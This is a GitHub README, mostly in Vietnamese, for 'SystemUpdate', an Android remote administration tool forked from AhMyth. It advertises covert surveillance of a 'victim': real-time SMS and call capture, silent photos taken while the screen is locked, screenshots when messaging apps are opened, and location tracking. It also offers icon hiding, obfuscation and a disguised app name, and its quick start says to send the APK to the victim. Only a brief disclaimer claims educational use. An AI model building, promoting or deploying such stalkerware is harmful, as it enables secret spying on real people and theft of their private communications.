# 🎯 SystemUpdate - Android Remote Administration Tool

[![GitHub](https://img.shields.io/badge/GitHub-dinhkhanhtung-blue)](https://github.com/dinhkhanhtung/SystemUpdate)
[![Android](https://img.shields.io/badge/Android-4.1%2B-green)](https://developer.android.com)
[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE.md)

**Hệ thống giám sát Android hoàn chỉnh với lưu trữ vĩnh viễn, đồng bộ realtime, và khả năng stealth cao.**

---

## ✨ Tính Năng Chính

### 🗄️ **Lưu Trữ Vĩnh Viễn**
- Tất cả dữ liệu lưu vào JSON database
- Không mất dữ liệu khi tắt server
- Xem lịch sử khi victim offline

### ⚡ **Đồng Bộ Realtime**
- Phát hiện SMS/Call mới **< 3 giây**
- Lưu trước khi họ kịp xóa
- Content Observer tự động theo dõi

### 🔄 **Tự Động Kết Nối Lại**
- Watchdog kiểm tra mỗi 3 phút
- Tự động reconnect khi server online
- Không cần bật máy cả ngày

### 📸 **Chụp Ảnh Khi Màn Hình Khóa**
- Tự động mở khóa → Chụp → Khóa lại
- Tắt flash & sound (stealth)
- Không để lại dấu vết

### 📊 **Export Dữ Liệu**
- Excel (.xlsx) - Tất cả dữ liệu
- Google Maps (.kml) - Lịch sử vị trí
- Text (.txt) - Tin nhắn

### 🔋 **Tối Ưu Pin & Stealth**
- Bypass battery optimization
- ProGuard obfuscation
- Silent notifications
- Ẩn icon sau khi cấp quyền
- **Smart Sleep:** Auto Screenshot tự động tắt khi màn hình tắt để tiết kiệm pin.

### 📸 **Auto Screenshot (Mới)**
- Tự động chụp màn hình khi nạn nhân mở Zalo/Messenger/Facebook.
- Gửi ảnh về Server ngay lập tức.
- Chế độ Stealth: Không bật màn hình, không flash, không âm thanh.

### 🎨 **Giao Diện Cải Tiến**
- Nút bấm có hiệu ứng Loading/Success visual feedback.
- Thanh tiến trình khi ghi âm.
- Quản lý Screenshot tập trung.

---

## 🚀 Quick Start

### 1. Cài Đặt Server

```bash
cd AhMyth-Server/app
npm install
npm start
```

### 2. Build APK

```bash
# Sử dụng APK Builder trong server UI
# Hoặc chạy script:
Build_Optimized_APK.bat
```

### 3. Cài Đặt APK

- Gửi APK cho victim
- Victim cài đặt và cấp quyền
- App tự động ẩn và kết nối

---

## 📂 Cấu Trúc Dữ Liệu

```
AhMyth-Server/app/
├── data/
│   └── database.json          # Database JSON
├── logs/
│   └── <victim_id>/
│       ├── locations.log      # Vị trí GPS
│       ├── messages.log       # Thông báo
│       ├── realtime_sms.log   # SMS realtime
│       └── realtime_calls.log # Call realtime
└── exports/
    ├── *.xlsx                 # Excel exports
    ├── *.kml                  # Google Maps
    └── *.txt                  # Text exports
```

---

## 📚 Tài Liệu

- **[SETUP_GUIDE.md](SETUP_GUIDE.md)** - Hướng dẫn cài đặt chi tiết
- **[FEATURES.md](FEATURES.md)** - Chi tiết các tính năng

---

## ⚠️ Lưu Ý Pháp Lý

**Công cụ này chỉ dành cho mục đích giáo dục và nghiên cứu.**

- ❌ KHÔNG sử dụng để xâm phạm quyền riêng tư người khác
- ❌ KHÔNG sử dụng cho mục đích bất hợp pháp
- ✅ Chỉ sử dụng trên thiết bị của bạn hoặc có sự đồng ý

**Người dùng chịu trách nhiệm hoàn toàn về việc sử dụng công cụ này.**

---

## 🤝 Đóng Góp

Contributions are welcome! Please feel free to submit a Pull Request.

---

## 📄 License

MIT License - See [LICENSE.md](LICENSE.md) for details

---

## 🔗 Links

- **GitHub:** https://github.com/dinhkhanhtung/SystemUpdate
- **Original Project:** [AhMyth Android RAT](https://github.com/AhMyth/AhMyth-Android-RAT)

---

**Made with ❤️ by dinhkhanhtung**
